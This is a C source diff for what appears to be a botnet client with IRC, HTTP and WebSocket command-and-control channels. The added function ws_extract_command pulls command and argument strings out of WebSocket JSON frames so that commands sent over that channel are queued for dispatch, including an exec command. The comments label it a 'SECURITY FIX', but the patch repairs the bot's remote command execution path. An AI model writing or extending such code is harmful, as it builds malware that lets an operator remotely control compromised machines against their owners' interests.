@@ -1945,12 +1945,58 @@ int protocol_connect_all(notnet_bot_t *bot) {
     return 0;
 }
 
+/* SECURITY FIX (#120): the WS channel previously queued the RAW JSON frame
+ * ({"cmd":...,"args":...,"secret":...}) into cmd_queue, but dispatch matches
+ * command prefixes (strncmp(cmd, CMD_EXEC, ...)) — so a WS-served command
+ * was silently never executed. Mirror the HTTP extraction: pull "cmd" and
+ * "args" out of the frame into a "cmd args" string, bounded. Returns 1 on
+ * success, 0 on no/malformed cmd. */
+static int ws_extract_command(const char *frame, char *out, size_t out_sz) {
+    const char *cmd_key = strstr(frame, "\"cmd\"");
+    if (!cmd_key || out_sz < 2) return 0;
+    const char *start = strchr(cmd_key + 6, '"');
+    const char *end = start ? strchr(start + 1, '"') : NULL;
+    if (!start || !end || end <= start) return 0;
+    size_t clen = (size_t)(end - start - 1);
+    if (clen == 0 || clen >= 128) return 0;
+
+    char cmd[128];
+    memcpy(cmd, start + 1, clen);
+    cmd[clen] = '\0';
+
+    const char *args_key = strstr(frame, "\"args\"");
+    char args[256] = {0};
+    size_t alen = 0;
+    if (args_key) {
+        const char *colon = strchr(args_key + 6, ':');
+        const char *args_val = colon ? strchr(colon + 1, '"') : NULL;
+        if (args_val) {
+            const char *args_end = strchr(args_val + 1, '"');
+            if (args_end && args_end > args_val) {
+                alen = (size_t)(args_end - args_val - 1);
+                if (alen >= sizeof(args)) alen = sizeof(args) - 1;
+                memcpy(args, args_val + 1, alen);
+                args[alen] = '\0';
+            }
+        }
+    }
+
+    int n;
+    if (alen > 0) {
+        n = snprintf(out, out_sz, "%s %s", cmd, args);
+    } else {
+        n = snprintf(out, out_sz, "%s", cmd);
+    }
+    return (n > 0 && (size_t)n < out_sz) ? 1 : 0;
+}
+
 int protocol_process_commands(notnet_bot_t *bot) {
     /* SECURITY FIX (#9): Use separate buffers per channel to prevent
      * one channel's read from overwriting another's queued command. */
     char irc_buf[1024];
     char http_buf[1024];
     char ws_buf[1024];
+    
     
     /* Check IRC - always read when connected, auth may not be set yet */
     if (bot->c2_irc.connected) {
@@ -2044,9 +2090,15 @@ int protocol_process_commands(notnet_bot_t *bot) {
             /* SECURITY FIX (#35): Same auth gate as HTTP — only trust
              * frames that echo the shared secret. */
             if (http_body_has_secret(bot, ws_buf)) {
-                if (bot->cmd_count < 256) {
-                    snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", ws_buf);
+                /* SECURITY FIX (#120): extract cmd/args from the JSON frame
+                 * instead of queueing the raw frame — dispatch matches
+                 * command prefixes, so the raw JSON was never executed. */
+                char extracted[256];
+                if (bot->cmd_count < 256 &&
+                    ws_extract_command(ws_buf, extracted, sizeof(extracted))) {
+                    snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", extracted);
                     bot->cmd_count++;
+                    log_info("WS: command: %s", extracted);
                 }
             } else {
                 log_warn("WS: command rejected — frame did not echo shared secret");
